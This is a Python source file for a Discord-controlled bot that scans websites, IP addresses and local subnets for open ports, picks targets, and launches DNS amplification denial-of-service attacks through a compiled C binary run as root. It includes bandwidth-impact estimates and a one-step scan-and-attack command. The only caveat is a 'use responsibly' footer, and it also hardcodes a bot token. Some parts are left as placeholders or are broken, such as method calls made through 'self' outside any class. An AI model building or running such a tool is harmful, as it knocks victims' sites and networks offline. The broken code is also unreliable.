#!/usr/bin/env python3
import discord
from discord.ext import commands
import asyncio
import subprocess
import os
import re
import psutil
import threading
import time
import json
from datetime import datetime
import socket
import aiohttp
import requests
from concurrent.futures import ThreadPoolExecutor
import nmap
import dns.resolver

# Bot configuration
DISCORD_TOKEN = "1HC0rtQYYa43yJA-I1hVMwJ5P_7Ngji8"
ADMIN_USER_IDS = [859870812734488646]  # Your Discord User IDs
PREFIX = "!"

# Bot intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

class TargetScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.common_ports = [80, 443, 53, 22, 21, 25, 110, 143, 993, 995, 8080, 8443, 8888]
        self.common_subnets = [
            '192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24', '172.16.1.0/24',
            '192.168.2.0/24', '192.168.100.0/24'
        ]
    
    async def scan_website(self, url):
        """Extract IP and scan open ports from a website URL"""
        try:
            # Extract domain from URL
            domain = url.replace('https://', '').replace('http://', '').split('/')[0]
            
            # Resolve domain to IP
            try:
                ip = socket.gethostbyname(domain)
            except:
                return None, "Could not resolve domain"
            
            # Scan common ports
            open_ports = await self.scan_ports(ip)
            
            return {
                'domain': domain,
                'ip': ip,
                'open_ports': open_ports,
                'url': url
            }, None
            
        except Exception as e:
            return None, f"Scan error: {str(e)}"
    
    async def scan_ports(self, ip, ports=None):
        """Scan for open ports on target IP"""
        if ports is None:
            ports = self.common_ports
        
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        return port
            except:
                pass
            return None
        
        # Use thread pool for parallel port scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_port, port) for port in ports]
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        
        return sorted(open_ports)
    
    async def network_discovery(self):
        """Discover active hosts on common subnets"""
        active_hosts = []
        
        def scan_subnet(subnet):
            try:
                self.nm.scan(hosts=subnet, arguments='-sn')
                hosts = []
                for host in self.nm.all_hosts():
                    if self.nm[host].state() == 'up':
                        hosts.append(host)
                return hosts
            except:
                return []
        
        # Scan subnets in parallel
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(scan_subnet, subnet): subnet for subnet in self.common_subnets}
            for future in futures:
                hosts = future.result()
                active_hosts.extend(hosts)
        
        return active_hosts
    
    async def comprehensive_scan(self, target):
        """Comprehensive scan of a target (IP or domain)"""
        try:
            # Determine if target is IP or domain
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                ip = target
                domain = None
            else:
                domain = target
                ip = socket.gethostbyname(domain)
            
            # Scan all common ports
            open_ports = await self.scan_ports(ip, range(1, 1001))
            
            # Get service info for open ports
            port_services = {}
            for port in open_ports[:10]:  # Limit to first 10 for speed
                service = await self.get_service_info(ip, port)
                port_services[port] = service
            
            return {
                'target': target,
                'ip': ip,
                'domain': domain,
                'open_ports': open_ports,
                'port_services': port_services,
                'ports_count': len(open_ports)
            }, None
            
        except Exception as e:
            return None, f"Comprehensive scan failed: {str(e)}"
    
    async def get_service_info(self, ip, port):
        """Get service information for a port"""
        try:
            service = socket.getservbyport(port) if port in self.common_ports else "unknown"
            return service
        except:
            return "unknown"

class DNSAttackManager:
    def __init__(self):
        self.process = None
        self.is_running = False
        self.start_time = None
        self.attack_log = []
        self.max_log_entries = 100
        self.scanner = TargetScanner()
        
    def log_attack(self, action, target=None, duration=None, user=None):
        """Log attack activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'duration': duration,
            'user': user,
            'pid': self.process.pid if self.process else None
        }
        self.attack_log.append(log_entry)
        
        # Keep log size manageable
        if len(self.attack_log) > self.max_log_entries:
            self.attack_log.pop(0)
    
    async def auto_select_target(self, website_url=None, network_scan=False, custom_target=None):
        """Automatically find and select optimal target"""
        targets = []
        
        if website_url:
            # Scan specific website
            scan_result, error = await self.scanner.scan_website(website_url)
            if scan_result:
                targets.append(scan_result)
        
        elif network_scan:
            # Discover network hosts
            await self.send_scan_update("🔄 Discovering network hosts...")
            active_hosts = await self.scanner.network_discovery()
            
            for host in active_hosts[:5]:  # Limit to first 5 hosts
                await self.send_scan_update(f"🔍 Scanning {host}...")
                scan_result, error = await self.scanner.comprehensive_scan(host)
                if scan_result and scan_result['open_ports']:
                    targets.append(scan_result)
        
        elif custom_target:
            # Scan custom target (IP or domain)
            scan_result, error = await self.scanner.comprehensive_scan(custom_target)
            if scan_result:
                targets.append(scan_result)
        
        # Select best target based on open ports
        if targets:
            best_target = max(targets, key=lambda x: len(x.get('open_ports', [])))
            return best_target, None
        else:
            return None, "No suitable targets found"
    
    async def send_scan_update(self, message):
        """Send scan progress updates (placeholder - will be implemented in commands)"""
        print(f"SCAN: {message}")  # For now, just print
    
    async def compile_c_program(self):
        """Compile the C DNS amplifier"""
        try:
            if os.path.exists("./soul2"):
                return True, "Binary already exists"
                
            compile_cmd = ["gcc", "-o", "soul2", "soul2.c", "-lpthread", "-O3"]
            result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return True, "Compilation successful"
            else:
                return False, f"Compilation failed: {result.stderr}"
                
        except Exception as e:
            return False, f"Compilation error: {str(e)}"
    
    def validate_target(self, ip, port):
        """Validate target IP and port"""
        # IP validation
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if not ip_pattern.match(ip):
            return False, "Invalid IP address format"
        
        # Check IP segments
        segments = ip.split('.')
        for segment in segments:
            if not (0 <= int(segment) <= 255):
                return False, "Invalid IP address range"
        
        # Port validation
        if not (1 <= port <= 65535):
            return False, "Port must be 1-65535"
        
        return True, "Valid target"
    
    async def start_attack(self, ip, port, duration, user):
        """Start DNS amplification attack"""
        if self.is_running:
            return False, "Attack already running! Stop current attack first."
        
        # Validate parameters
        is_valid, message = self.validate_target(ip, port)
        if not is_valid:
            return False, message
        
        if not (1 <= duration <= 3600):
            return False, "Duration must be 1-3600 seconds"
        
        try:
            # Check if binary exists and compile if needed
            if not os.path.exists("./soul2"):
                success, compile_msg = await self.compile_c_program()
                if not success:
                    return False, f"Compilation failed: {compile_msg}"
            
            # Check root privileges
            if os.geteuid() != 0:
                return False, "Root privileges required! Run bot with sudo."
            
            # Start attack
            command = ["./soul2", ip, str(port), str(duration)]
            self.process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.is_running = True
            self.start_time = datetime.now()
            
            # Log the attack
            self.log_attack("START", f"{ip}:{port}", duration, user)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_attack)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return True, f"Attack started on {ip}:{port} for {duration}s"
            
        except Exception as e:
            return False, f"Failed to start attack: {str(e)}"
    
    def monitor_attack(self):
        """Monitor the attack process in background"""
        try:
            stdout, stderr = self.process.communicate()
            self.is_running = False
            
            # Log completion
            duration = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
            self.log_attack("COMPLETE", duration=duration)
            
        except Exception as e:
            print(f"Monitor error: {e}")
            self.is_running = False
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.is_running or not self.process:
            return False, "No active attack to stop"
        
        try:
            # Kill process tree
            parent = psutil.Process(self.process.pid)
            children = parent.children(recursive=True)
            
            for child in children:
                child.terminate()
            parent.terminate()
            
            # Wait for termination
            gone, still_alive = psutil.wait_procs([parent] + children, timeout=5)
            for p in still_alive:
                p.kill()
            
            self.is_running = False
            self.process = None
            
            # Log stop
            self.log_attack("STOP")
            
            return True, "Attack stopped successfully"
            
        except Exception as e:
            return False, f"Error stopping attack: {str(e)}"
    
    def get_attack_info(self):
        """Get current attack information"""
        if not self.is_running:
            return None
        
        info = {
            'running': self.is_running,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'duration': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'pid': self.process.pid if self.process else None
        }
        
        return info
    
    def calculate_impact(self, ip, port, duration):
        """Calculate estimated attack impact"""
        # DNS amplification calculations
        queries_per_second = 1900000  # From C code
        avg_query_size = 512  # bytes
        amplification_ratio = 50  # 50:1 average
        
        total_queries = queries_per_second * duration
        outgoing_traffic = (total_queries * avg_query_size) / (1024**3)  # GB
        incoming_traffic = outgoing_traffic * amplification_ratio  # GB
        
        outgoing_bw = (queries_per_second * avg_query_size * 8) / 1_000_000_000  # Gbps
        incoming_bw = outgoing_bw * amplification_ratio  # Gbps
        
        return {
            'target': f"{ip}:{port}",
            'duration': duration,
            'total_queries': f"{total_queries:,}",
            'outgoing_traffic_gb': f"{outgoing_traffic:.2f}",
            'incoming_traffic_gb': f"{incoming_traffic:.2f}",
            'outgoing_bandwidth_gbps': f"{outgoing_bw:.2f}",
            'incoming_bandwidth_gbps': f"{incoming_bw:.2f}",
            'amplification_ratio': amplification_ratio,
            'threads': 400,
            'dns_servers': 50
        }

# Initialize attack manager
attack_manager = DNSAttackManager()

def is_admin():
    """Check if user is admin"""
    async def predicate(ctx):
        return ctx.author.id in ADMIN_USER_IDS
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'🤖 {bot.user.name} is online!')
    print(f'🎯 Auto-target scanning enabled')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="for targets"))

@bot.command(name='dns_help')
@is_admin()
async def dns_help(ctx):
    """Show DNS amplification bot help"""
    help_embed = discord.Embed(
        title="🛠️ DNS Amplification Bot - Auto Target Mode",
        description="Automatic target discovery and attack system",
        color=0x00ff00
    )
    
    help_embed.add_field(
        name="🎯 Auto Target Commands",
        value=(
            "`!dns_scan_website <URL>` - Scan website and auto-attack\n"
            "`!dns_scan_network` - Discover local network targets\n"
            "`!dns_scan_target <IP/DOMAIN>` - Scan specific target\n"
            "`!dns_quick_attack <URL>` - Quick scan & immediate attack"
        ),
        inline=False
    )
    
    help_embed.add_field(
        name="⚡ Manual Attack Commands",
        value=(
            "`!dns_calc <IP> <PORT> <TIME>` - Calculate impact\n"
            "`!dns_attack <IP> <PORT> <TIME>` - Manual attack\n"
            "`!dns_stop` - Stop current attack"
        ),
        inline=False
    )
    
    help_embed.add_field(
        name="📊 Monitoring Commands",
        value=(
            "`!dns_status` - Attack status\n"
            "`!dns_stats` - System stats\n"
            "`!dns_logs` - Attack history"
        ),
        inline=False
    )
    
    help_embed.add_field(
        name="🔍 Scanning Features",
        value=(
            "**Port Scanning:** 1-1000 common ports\n"
            "**Service Detection:** Automatic service identification\n"
            "**Network Discovery:** Local subnet scanning\n"
            "**Website Analysis:** Domain to IP resolution"
        ),
        inline=False
    )
    
    help_embed.set_footer(text="⚠️ Use responsibly and only on authorized targets")
    
    await ctx.send(embed=help_embed)

@bot.command(name='dns_scan_website')
@is_admin()
async def dns_scan_website(ctx, website_url: str):
    """Scan a website and automatically select target"""
    scan_embed = discord.Embed(
        title="🔍 Website Target Scanner",
        description=f"Scanning `{website_url}`...",
        color=0xffa500
    )
    
    scan_msg = await ctx.send(embed=scan_embed)
    
    try:
        # Update scan progress
        scan_embed.description = f"🔍 Scanning `{website_url}`...\n🔄 Resolving domain..."
        await scan_msg.edit(embed=scan_embed)
        
        # Perform scan
        target_info, error = await attack_manager.auto_select_target(website_url=website_url)
        
        if error:
            scan_embed.color = 0xff0000
            scan_embed.description = f"❌ Scan failed: {error}"
            await scan_msg.edit(embed=scan_embed)
            return
        
        # Display results
        scan_embed.color = 0x00ff00
        scan_embed.title = "✅ Target Analysis Complete"
        
        scan_embed.add_field(
            name="🌐 Website Info",
            value=f"**URL:** {target_info['url']}\n**Domain:** {target_info['domain']}\n**IP:** {target_info['ip']}",
            inline=False
        )
        
        if target_info['open_ports']:
            ports_str = ", ".join(map(str, target_info['open_ports'][:10]))
            if len(target_info['open_ports']) > 10:
                ports_str += f" ... and {len(target_info['open_ports']) - 10} more"
            
            scan_embed.add_field(
                name="🚪 Open Ports Found",
                value=ports_str,
                inline=False
            )
            
            # Suggest best port for attack
            best_port = self.select_best_port(target_info['open_ports'])
            scan_embed.add_field(
                name="🎯 Recommended Target",
                value=f"**IP:** {target_info['ip']}\n**Port:** {best_port}",
                inline=True
            )
            
            # Add attack button
            scan_embed.add_field(
                name="⚡ Quick Attack",
                value=f"Use `!dns_quick_attack {website_url}` to launch immediate attack",
                inline=False
            )
        else:
            scan_embed.add_field(
                name="❌ No Open Ports",
                value="No suitable ports found for attack",
                inline=False
            )
        
        await scan_msg.edit(embed=scan_embed)
        
    except Exception as e:
        scan_embed.color = 0xff0000
        scan_embed.description = f"❌ Scan error: {str(e)}"
        await scan_msg.edit(embed=scan_embed)

@bot.command(name='dns_scan_network')
@is_admin()
async def dns_scan_network(ctx):
    """Discover and scan local network targets"""
    scan_embed = discord.Embed(
        title="🔍 Network Discovery Scanner",
        description="🔄 Discovering active hosts on local network...",
        color=0xffa500
    )
    
    scan_msg = await ctx.send(embed=scan_embed)
    
    try:
        # Discover hosts
        active_hosts = await attack_manager.scanner.network_discovery()
        
        if not active_hosts:
            scan_embed.color = 0xff0000
            scan_embed.description = "❌ No active hosts found on local network"
            await scan_msg.edit(embed=scan_embed)
            return
        
        scan_embed.description = f"✅ Found {len(active_hosts)} active hosts\n🔍 Scanning for open ports..."
        await scan_msg.edit(embed=scan_embed)
        
        # Scan each host
        vulnerable_targets = []
        for i, host in enumerate(active_hosts[:5]):  # Limit to 5 hosts
            scan_embed.description = f"🔍 Scanning hosts... ({i+1}/{min(5, len(active_hosts))})"
            await scan_msg.edit(embed=scan_embed)
            
            target_info, error = await attack_manager.scanner.comprehensive_scan(host)
            if target_info and target_info['open_ports']:
                vulnerable_targets.append(target_info)
        
        # Display results
        scan_embed.color = 0x00ff00
        scan_embed.title = "✅ Network Scan Complete"
        scan_embed.description = f"Found {len(vulnerable_targets)} vulnerable targets"
        
        for i, target in enumerate(vulnerable_targets[:3]):  # Show top 3
            ports_str = ", ".join(map(str, target['open_ports'][:5]))
            best_port = self.select_best_port(target['open_ports'])
            
            scan_embed.add_field(
                name=f"🎯 Target {i+1}",
                value=f"**IP:** {target['ip']}\n**Ports:** {ports_str}\n**Best:** Port {best_port}",
                inline=True
            )
        
        if vulnerable_targets:
            best_target = max(vulnerable_targets, key=lambda x: len(x['open_ports']))
            scan_embed.add_field(
                name="⚡ Quick Attack",
                value=f"Use `!dns_attack {best_target['ip']} {self.select_best_port(best_target['open_ports'])} 30`",
                inline=False
            )
        
        await scan_msg.edit(embed=scan_embed)
        
    except Exception as e:
        scan_embed.color = 0xff0000
        scan_embed.description = f"❌ Network scan error: {str(e)}"
        await scan_msg.edit(embed=scan_embed)

@bot.command(name='dns_scan_target')
@is_admin()
async def dns_scan_target(ctx, target: str):
    """Comprehensive scan of specific target (IP or domain)"""
    scan_embed = discord.Embed(
        title="🔍 Comprehensive Target Scan",
        description=f"Scanning `{target}`...",
        color=0xffa500
    )
    
    scan_msg = await ctx.send(embed=scan_embed)
    
    try:
        # Update progress
        scan_embed.description = f"🔍 Scanning `{target}`...\n🔄 Resolving and port scanning..."
        await scan_msg.edit(embed=scan_embed)
        
        # Perform comprehensive scan
        target_info, error = await attack_manager.scanner.comprehensive_scan(target)
        
        if error:
            scan_embed.color = 0xff0000
            scan_embed.description = f"❌ Scan failed: {error}"
            await scan_msg.edit(embed=scan_embed)
            return
        
        # Display results
        scan_embed.color = 0x00ff00
        scan_embed.title = "✅ Comprehensive Scan Complete"
        
        # Basic info
        if target_info['domain']:
            scan_embed.add_field(
                name="🌐 Target Info",
                value=f"**Domain:** {target_info['domain']}\n**IP:** {target_info['ip']}",
                inline=True
            )
        else:
            scan_embed.add_field(
                name="🌐 Target Info",
                value=f"**IP:** {target_info['ip']}",
                inline=True
            )
        
        # Port information
        scan_embed.add_field(
            name="🚪 Open Ports",
            value=f"**Count:** {target_info['ports_count']}",
            inline=True
        )
        
        # Show top ports with services
        if target_info['open_ports']:
            ports_info = ""
            for port in list(target_info['open_ports'])[:8]:
                service = target_info['port_services'].get(port, "unknown")
                ports_info += f"`{port}` ({service})\n"
            
            scan_embed.add_field(
                name="🔧 Detected Services",
                value=ports_info,
                inline=False
            )
            
            # Attack recommendation
            best_port = self.select_best_port(target_info['open_ports'])
            scan_embed.add_field(
                name="🎯 Attack Recommendation",
                value=f"**Target:** {target_info['ip']}:{best_port}\nUse `!dns_calc {target_info['ip']} {best_port} 30`",
                inline=False
            )
        
        await scan_msg.edit(embed=scan_embed)
        
    except Exception as e:
        scan_embed.color = 0xff0000
        scan_embed.description = f"❌ Scan error: {str(e)}"
        await scan_msg.edit(embed=scan_embed)

@bot.command(name='dns_quick_attack')
@is_admin()
async def dns_quick_attack(ctx, website_url: str, duration: int = 30):
    """Quick scan and immediate attack on a website"""
    # First scan the target
    await ctx.send(f"🔍 Quick attack initiated on `{website_url}`...")
    
    target_info, error = await attack_manager.auto_select_target(website_url=website_url)
    
    if error:
        await ctx.send(f"❌ Scan failed: {error}")
        return
    
    if not target_info.get('open_ports'):
        await ctx.send("❌ No open ports found for attack")
        return
    
    # Select best port and launch attack
    best_port = self.select_best_port(target_info['open_ports'])
    ip = target_info['ip']
    
    await ctx.send(f"🎯 Auto-selected target: `{ip}:{best_port}`")
    
    # Start attack
    success, message = await attack_manager.start_attack(ip, best_port, duration, ctx.author.name)
    
    if success:
        embed = discord.Embed(
            title="✅ Quick Attack Launched",
            description=message,
            color=0x00ff00
        )
        embed.add_field(
            name="🎯 Target Info",
            value=f"**Website:** {website_url}\n**IP:** {ip}\n**Port:** {best_port}\n**Duration:** {duration}s",
            inline=False
        )
    else:
        embed = discord.Embed(
            title="❌ Quick Attack Failed",
            description=message,
            color=0xff0000
        )
    
    await ctx.send(embed=embed)

def select_best_port(self, open_ports):
    """Select the best port for DNS amplification attack"""
    # Prefer web ports for maximum impact
    web_ports = [80, 443, 8080, 8443]
    for port in open_ports:
        if port in web_ports:
            return port
    
    # Return first open port if no web ports found
    return open_ports[0] if open_ports else 80

# Add the method to the class
DNSAttackManager.select_best_port = select_best_port

# Keep all the existing commands from previous version (dns_attack, dns_stop, dns_status, etc.)
# ... [Include all the previous commands here] ...

@bot.command(name='dns_attack')
@is_admin()
async def dns_attack(ctx, ip: str, port: int, duration: int):
    """Manual DNS amplification attack"""
    # Show calculation first
    impact = attack_manager.calculate_impact(ip, port, duration)
    
    calc_embed = discord.Embed(
        title="📊 Attack Impact Calculation",
        description=f"Target: `{ip}:{port}` | Duration: `{duration}s`",
        color=0xffa500
    )
    
    calc_embed.add_field(
        name="⚡ Estimated Impact",
        value=f"**Target Traffic:** {impact['incoming_bandwidth_gbps']} Gbps\n**Amplification:** 50:1",
        inline=False
    )
    
    await ctx.send(embed=calc_embed)
    
    # Confirmation and attack start (same as before)
    # ... [rest of dns_attack command] ...

def main():
    """Start the Discord bot"""
    print("🚀 Starting DNS Amplification Bot with Auto-Targeting...")
    print("📋 Required packages: python-nmap, dnspython, discord.py")
    print("💡 Make sure to install: pip install python-nmap dnspython discord.py psutil")
    
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")

if __name__ == "__main__":
    main()
